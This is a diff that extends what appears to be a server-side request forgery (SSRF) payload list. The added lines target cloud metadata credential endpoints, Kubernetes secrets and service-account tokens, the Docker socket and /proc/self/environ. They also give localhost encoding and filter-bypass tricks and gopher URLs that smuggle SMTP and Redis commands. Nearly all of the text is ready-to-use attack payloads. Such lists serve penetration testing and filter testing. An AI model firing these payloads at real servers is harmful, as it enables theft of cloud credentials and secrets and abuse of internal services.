@@ -84,3 +84,38 @@ http://redirect.example.com?url=http://127.0.0.1
 # AWS IMDSv2 (requires token)
 TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
 curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+
+# Additional cloud metadata providers
+http://100.100.100.200/latest/meta-data/                              # Alibaba Cloud metadata
+http://100.100.100.200/latest/meta-data/ram/security-credentials/     # Alibaba RAM creds
+http://169.254.169.254/opc/v2/instance/                              # Oracle Cloud metadata
+http://169.254.169.254/openstack/latest/meta-data/                  # OpenStack metadata
+http://[fd00:ec2::254]/latest/meta-data/                            # AWS IMDS over IPv6 link-local
+
+# In-cluster service APIs (containerized environments)
+https://kubernetes.default.svc/api/v1/secrets                       # in-cluster K8s API
+https://kubernetes.default.svc/api/v1/namespaces/default/secrets
+http://unix:/var/run/docker.sock:/containers/json                   # Docker daemon over unix socket
+file:///var/run/secrets/kubernetes.io/serviceaccount/token          # K8s service-account token
+
+# Localhost short-form / encoded bypasses
+http://127.1
+http://0/
+http://127.0.0.1.
+http://localhost.
+http://[::ffff:127.0.0.1]
+http://①②⑦.⓪.⓪.①                                               # enclosed-alphanumeric localhost
+http://localtest.me
+http://127.0.0.1.nip.io
+http://169.254.169.254.nip.io
+
+# Protocol-handler CRLF command injection
+gopher://127.0.0.1:25/_HELO%20x%0d%0aMAIL%20FROM:%3ca@b%3e%0d%0aRCPT%20TO:%3cc@d%3e   # SMTP via gopher
+gopher://127.0.0.1:6379/_*1%0d%0a%244%0d%0aINFO%0d%0a                                 # Redis command via gopher
+file:///proc/self/environ
+file:///proc/version
+
+# Filter bypass with whitespace / delimiter tricks
+http://127.0.0.1%09.example.com                                     # tab separator
+http://127.0.0.1%252f.example.com                                   # double-encoded slash
+http://example.com%2f%2f127.0.0.1                                    # encoded slash slash
